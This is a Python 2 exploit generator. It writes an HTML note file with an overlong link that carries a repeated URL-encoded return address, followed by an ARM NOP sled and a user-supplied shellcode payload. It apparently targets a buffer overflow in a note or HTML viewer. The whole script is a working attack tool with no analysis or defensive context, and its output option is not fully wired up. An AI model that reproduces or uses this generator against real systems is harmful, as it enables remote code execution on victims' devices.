import sys
import getopt
import struct

def write_note(address, payload, output_file, shift):
  pointer = "00000000%x" % address
  if shift:
    padding = 4094
    link_body = 'aaa'
  else:
    padding = 4096
    link_body = 'a'
  pointer = "%" + pointer[-2:] + "%" + pointer[-4:-2] + "%" + pointer[-6:-4] + "%" + pointer[-8:-6]
  data = "<a href=\"" + ("A" * 256) + pointer * 64 + "\">" + link_body + "</a>"
  data += struct.pack("<I", 0xe1a01001) * ((padding - len(data) - len(payload)) / 4) + payload
  outfile = open(output_file, "wb")
  outfile.write(data)
  outfile.close()

def main(argv):
    shift = False
    address = None
    payload_file = None
    output_file = 'note.htm'
    try:                                
        opts, args = getopt.getopt(argv, "a:p:s", ["address=", "payload=", "shift"])
        for opt, arg in opts:
            if opt in ("-s", "--shift"):
                shift = True
            if opt in ("-a", "--address"):
                address = int(arg, 16)
            if opt in ("-p", "--payload"):
                payload_file = arg
            if opt in ("-o", "--output"):
                output_file = arg
        if (address is None) or (payload_file is None):
            print 'Address and payload arguments are required'
            sys.exit(2)
    except (getopt.GetoptError, ValueError):
        print 'Invalid arguments'
        sys.exit(2)
    try:
        payload = file(payload_file, 'rb').read()
    except IOError:
        print 'Payload file not found'
        sys.exit(2)
    write_note(address, payload, output_file, shift)

if __name__ == "__main__":
    main(sys.argv[1:])
